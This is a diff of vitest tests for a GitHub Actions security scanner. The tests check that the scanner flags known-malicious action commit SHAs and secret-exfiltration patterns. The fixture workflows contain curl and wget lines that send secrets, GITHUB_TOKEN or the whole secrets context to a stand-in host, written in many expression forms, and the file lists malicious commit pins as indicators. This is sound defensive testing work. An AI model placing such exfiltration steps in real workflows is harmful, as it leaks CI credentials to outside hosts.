@@ -1,7 +1,10 @@
 import { describe, it, expect, beforeEach, afterEach } from "vitest";
 import * as fs from "node:fs";
 import * as path from "node:path";
+import * as os from "node:os";
 import { scanGitHubActionsWorkflows } from "../github-actions-scanner.js";
+import { getBundledFeed } from "../threat-intel.js";
+import { performanceBudget } from "./performance-budget.js";
 
 /**
  * Helper: create a temp directory with .github/workflows/ structure
@@ -545,6 +548,24 @@ jobs:
     expect(findings.find((f) => f.rule === "GHA_OIDC_WRITE_PERM")?.severity).toBe("medium");
   });
 
+  it("describes GHA_OIDC_WRITE_PERM as the presence check it is", () => {
+    // The rule matches the permission alone. Its text must not imply that it
+    // correlated the permission with third-party actions or outbound calls.
+    writeWorkflow(tempDir, "oidc.yml", `
+on: push
+permissions:
+  id-token: write
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo deploying
+`);
+    const finding = scanGitHubActionsWorkflows(tempDir).find((f) => f.rule === "GHA_OIDC_WRITE_PERM");
+    expect(finding?.description).not.toMatch(/combined with|third-party|curl/i);
+    expect(finding?.description).toMatch(/does not inspect/i);
+  });
+
   it("should detect cache poisoning via github.head_ref", () => {
     writeWorkflow(tempDir, "cache.yml", `
 on: pull_request
@@ -582,11 +603,87 @@ jobs:
   changes:
     runs-on: ubuntu-latest
     steps:
-      - uses: tj-actions/changed-files@d8462b4fc879d893f8f3b49843bde065f3f07b82
+      - uses: tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67
 `);
     const findings = scanGitHubActionsWorkflows(tempDir);
     expect(findings.some((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA")).toBe(true);
     expect(findings.find((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA")?.severity).toBe("critical");
+  });
+
+  // Feed-driven (actions: entries). One of the 75 imposter commits the
+  // trivy-action tags were repointed to in March 2026.
+  it("should detect a TeamPCP trivy-action imposter commit", () => {
+    writeWorkflow(tempDir, "scan.yml", `
+on: push
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: aquasecurity/trivy-action@7550f14b64c1c724035a075b36e71423719a1f30 # 0.34.2
+`);
+    const hit = scanGitHubActionsWorkflows(tempDir).find((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA");
+    expect(hit?.description).toContain("TeamPCP Trivy Actions compromise");
+    expect(hit?.line).toBe(7);
+  });
+
+  // A commit SHA names one commit object; pushed from a fork it is reachable
+  // under any repository of the fork network, so the match is by SHA alone.
+  it("should detect a malicious SHA referenced through another repository name", () => {
+    writeWorkflow(tempDir, "ci.yml", `
+on: push
+jobs:
+  changes:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: someone-else/changed-files@0E58ED8671D6B60D0890C21B07F8835ACE038E67
+`);
+    expect(scanGitHubActionsWorkflows(tempDir).some((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA")).toBe(true);
+  });
+
+  // A composite action's own `uses:` steps run with the caller's secrets, and
+  // the workflow walker never reads action.yml, so it is checked on its own.
+  it("checks uses: in composite action metadata anywhere in the repo", async () => {
+    const { scanActionMetadataReferences, isActionMetadataFile } = await import("../github-actions-scanner.js");
+    const yml = [
+      "name: setup",
+      "runs:",
+      "  using: composite",
+      "  steps:",
+      "    - uses: aquasecurity/trivy-action@7550f14b64c1c724035a075b36e71423719a1f30",
+      "    - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
+    ].join("\n");
+    const found = scanActionMetadataReferences(yml, ".github/actions/setup/action.yml");
+    expect(found.map((f) => f.rule)).toEqual(["GHA_KNOWN_MALICIOUS_SHA"]);
+    expect(found[0]?.line).toBe(5);
+    expect(isActionMetadataFile(".github/actions/setup/action.yml")).toBe(true);
+    expect(isActionMetadataFile("action.yaml")).toBe(true);
+    // Workflows are the workflow walker's; never dispatched twice.
+    expect(isActionMetadataFile(".github/workflows/action.yml")).toBe(false);
+    expect(isActionMetadataFile("docs/action.yml.md")).toBe(false);
+  });
+
+  // Data contract the SHA index relies on: every bundled actions: entry is a
+  // lowercase owner/repo pinned to a lowercase 40-hex commit SHA.
+  it("keeps every bundled actions: entry a lowercase repo@sha pin", () => {
+    const entries = getBundledFeed().filter((i) => i.type === "package" && i.value.startsWith("actions:"));
+    expect(entries.length).toBeGreaterThanOrEqual(117);
+    for (const ioc of entries) {
+      expect(ioc.value, ioc.value).toMatch(/^actions:[a-z0-9_.-]+\/[a-z0-9_.-]+@[0-9a-f]{40}$/);
+      expect(ioc.campaign, `${ioc.value} must be curated`).toBeTruthy();
+    }
+  });
+
+  // The control: the clean 0.35.0 release every imposter commit was parented on.
+  it("should not flag the clean trivy-action release", () => {
+    writeWorkflow(tempDir, "scan.yml", `
+on: push
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: aquasecurity/trivy-action@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # 0.35.0
+`);
+    expect(scanGitHubActionsWorkflows(tempDir).filter((f) => f.rule === "GHA_KNOWN_MALICIOUS_SHA")).toEqual([]);
   });
 
   it("should not flag legitimate SHA-pinned action", () => {
@@ -839,4 +936,235 @@ describe("GHA artifact trust context (v5.23.4)", () => {
     );
     expect(finding?.description).toContain("no matching artifact producer");
   });
+});
+
+describe("GHA_SECRET_EXFIL_MULTILINE: every expression form of a secret reference", () => {
+  let tempDir: string;
+  beforeEach(() => {
+    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-gha-exfil-forms-"));
+  });
+  afterEach(() => {
+    fs.rmSync(tempDir, { recursive: true, force: true });
+  });
+
+  /** One step: `env: T: <value>`, then a curl on line 10. Returns EXFIL lines. */
+  function exfilLinesFor(envValue: string): number[] {
+    writeWorkflow(tempDir, "ci.yml", [
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      "      - env:",
+      `          T: ${envValue}`,
+      "        run: |",
+      '          curl -s -d "$T" https://x.example/collect',
+    ].join("\n"));
+    return scanGitHubActionsWorkflows(tempDir)
+      .filter((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")
+      .map((f) => f.line ?? -1);
+  }
+
+  it.each([
+    ["dot access", "${{ secrets.NPM_TOKEN }}"],
+    ["bracket access, single quotes", "${{ secrets['NPM_TOKEN'] }}"],
+    ["bracket access, double quotes", '${{ secrets["NPM_TOKEN"] }}'],
+    ["whitespace inside the expression", "${{secrets . NPM_TOKEN}}"],
+    ["a computed index", "${{ secrets[format('{0}_TOKEN', matrix.target)] }}"],
+    ["the whole secrets context via toJSON", "${{ toJSON(secrets) }}"],
+    ["the whole secrets context, bare", "${{ secrets }}"],
+    ["a secret inside a function call", "${{ format('Bearer {0}', secrets.NPM_TOKEN) }}"],
+    ["secrets.GITHUB_TOKEN", "${{ secrets.GITHUB_TOKEN }}"],
+    ["bracket GITHUB_TOKEN", "${{ secrets['GITHUB_TOKEN'] }}"],
+    ["github.token", "${{ github.token }}"],
+    ["bracket github token", "${{ github['token'] }}"],
+  ])("fires on the curl line for %s", (_label, value) => {
+    expect(exfilLinesFor(value)).toEqual([10]);
+  });
+
+  it.each([
+    ["a non-secret context", "${{ github.sha }}"],
+    ["an env reference", "${{ env.BUILD_ID }}"],
+    ["a step output named secrets", "${{ steps.secrets.outputs.value }}"],
+    ["the word outside an expression", "secrets"],
+  ])("does not fire for %s", (_label, value) => {
+    expect(exfilLinesFor(value)).toEqual([]);
+  });
+
+  it("fires for bracket access written directly into the run body", () => {
+    writeWorkflow(tempDir, "ci.yml", [
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      "      - run: |",
+      "          echo \"${{ secrets['NPM_TOKEN'] }}\" > t.txt",
+      "          curl -s --data-binary @t.txt https://x.example/collect",
+    ].join("\n"));
+    const lines = scanGitHubActionsWorkflows(tempDir)
+      .filter((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")
+      .map((f) => f.line);
+    expect(lines).toEqual([9]);
+  });
+
+  it("stays linear on 5 MiB of unclosed expressions", { timeout: performanceBudget(60_000) }, () => {
+    const unclosed = "${{ secrets ".repeat(Math.ceil((5 * 1024 * 1024) / 12));
+    const started = performance.now();
+    expect(exfilLinesFor(unclosed)).toEqual([]);
+    expect(performance.now() - started).toBeLessThan(performanceBudget(15_000));
+  });
+
+  function exfilLinesForWorkflow(lines: string[]): number[] {
+    writeWorkflow(tempDir, "ci.yml", lines.join("\n"));
+    return scanGitHubActionsWorkflows(tempDir)
+      .filter((f) => f.rule === "GHA_SECRET_EXFIL_MULTILINE")
+      .map((f) => f.line ?? -1);
+  }
+
+  it("sees a secret in an inline flow-map env at step level", () => {
+    expect(exfilLinesForWorkflow([
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      '      - env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      '        run: curl -d "$T" https://x.example',
+    ])).toEqual([8]);
+  });
+
+  it("sees a secret in an inline flow-map env at job level", () => {
+    expect(exfilLinesForWorkflow([
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      '    env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      "    steps:",
+      '      - run: curl -d "$T" https://x.example',
+    ])).toEqual([8]);
+  });
+
+  it("sees a secret in an inline flow-map env at workflow level", () => {
+    expect(exfilLinesForWorkflow([
+      "name: CI",
+      "on: push",
+      'env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      '      - run: curl -d "$T" https://x.example',
+    ])).toEqual([8]);
+  });
+
+  it("does not see an inline env of another step, another job, or a service container", () => {
+    expect(exfilLinesForWorkflow([
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  a:",
+      "    runs-on: ubuntu-latest",
+      '    env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      "    steps:",
+      "      - run: npm publish",
+      "  b:",
+      "    runs-on: ubuntu-latest",
+      "    services:",
+      "      db:",
+      "        image: postgres:16",
+      '        env: { P: "${{ secrets.DB_PASSWORD }}" }',
+      "    steps:",
+      '      - env: { T: "${{ secrets.NPM_TOKEN }}" }',
+      "        run: npm publish",
+      "      - env: { T: plain }",
+      '        run: curl -d "$T" https://x.example',
+    ])).toEqual([]);
+  });
+});
+
+describe("GHA_SECRET_CURL / GHA_SECRET_WGET / GHA_ENV_EXFIL: every expression form of a secret reference", () => {
+  let tempDir: string;
+  beforeEach(() => {
+    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-gha-line-forms-"));
+  });
+  afterEach(() => {
+    fs.rmSync(tempDir, { recursive: true, force: true });
+  });
+
+  const RULES = new Set(["GHA_SECRET_CURL", "GHA_SECRET_WGET", "GHA_ENV_EXFIL", "GHA_SECRET_EXFIL_MULTILINE"]);
+
+  /** Three one-line steps, each carrying the expression; returns "RULE@line" sorted. */
+  function reportFor(expr: string): { keys: string[]; matches: string[] } {
+    writeWorkflow(tempDir, "ci.yml", [
+      "name: CI",
+      "on: push",
+      "jobs:",
+      "  build:",
+      "    runs-on: ubuntu-latest",
+      "    steps:",
+      `      - run: curl -s -H X-Key:${expr} https://x.example`,
+      `      - run: echo ${expr} | wget --post-file=- https://x.example`,
+      `      - run: wget --header=X:${expr} https://x.example`,
+    ].join("\n"));
+    const found = scanGitHubActionsWorkflows(tempDir).filter((f) => RULES.has(f.rule));
+    return {
+      keys: found.map((f) => `${f.rule}@${f.line}`).sort(),
+      matches: found.map((f) => f.match ?? ""),
+    };
+  }
+
+  const DOT = reportFor.bind(null, "${{ secrets.NPM_TOKEN }}");
+
+  it("reports the dot form on all three rules (control)", () => {
+    const { keys, matches } = DOT();
+    expect(keys).toEqual(["GHA_ENV_EXFIL@7", "GHA_SECRET_CURL@7", "GHA_SECRET_WGET@8", "GHA_SECRET_WGET@9"]);
+    // The dot form is left as written, so its match is the pattern's own match.
+    for (const m of matches) expect(m).not.toMatch(/^- run:/);
+  });
+
+  it.each([
+    ["bracket access, single quotes", "${{ secrets['NPM_TOKEN'] }}"],
+    ["bracket access, double quotes", '${{ secrets["NPM_TOKEN"] }}'],
+    ["whitespace inside the expression", "${{secrets . NPM_TOKEN}}"],
+    ["a computed index", "${{ secrets[format('{0}_TOKEN', matrix.target)] }}"],
+    ["the whole secrets context via toJSON", "${{ toJSON(secrets) }}"],
+    ["the whole secrets context, bare", "${{ secrets }}"],
+    ["a secret inside a function call", "${{ format('Bearer {0}', secrets.NPM_TOKEN) }}"],
+    ["bracket GITHUB_TOKEN", "${{ secrets['GITHUB_TOKEN'] }}"],
+    ["github.token", "${{ github.token }}"],
+    ["bracket github token", "${{ github['token'] }}"],
+  ])("reports %s exactly as the dot form, with the file's own text as the match", (_label, expr) => {
+    const dotKeys = DOT().keys;
+    const { keys, matches } = reportFor(expr);
+    expect(keys).toEqual(dotKeys);
+    // The match shows the workflow's own text, not a rewritten expression.
+    for (const m of matches) expect(m).toContain(expr);
+  });
+
+  it.each([
+    ["a non-secret context", "${{ github.sha }}"],
+    ["a step output named secrets", "${{ steps.secrets.outputs.value }}"],
+  ])("reports nothing for %s", (_label, expr) => {
+    expect(reportFor(expr).keys).toEqual([]);
+  });
+
+  // reportFor writes the value on three lines, so a third of 5 MiB each.
+  it("stays linear on 5 MiB of expressions and on unclosed ones", { timeout: performanceBudget(60_000) }, () => {
+    const perLine = (5 * 1024 * 1024) / 3;
+    const many = "${{ github['token'] }}".repeat(Math.ceil(perLine / 22));
+    let started = performance.now();
+    reportFor(many);
+    expect(performance.now() - started).toBeLessThan(performanceBudget(15_000));
+
+    const unclosed = "${{ secrets ".repeat(Math.ceil(perLine / 12));
+    started = performance.now();
+    expect(reportFor(unclosed).keys).toEqual([]);
+    expect(performance.now() - started).toBeLessThan(performanceBudget(15_000));
+  }, 60_000);
 });
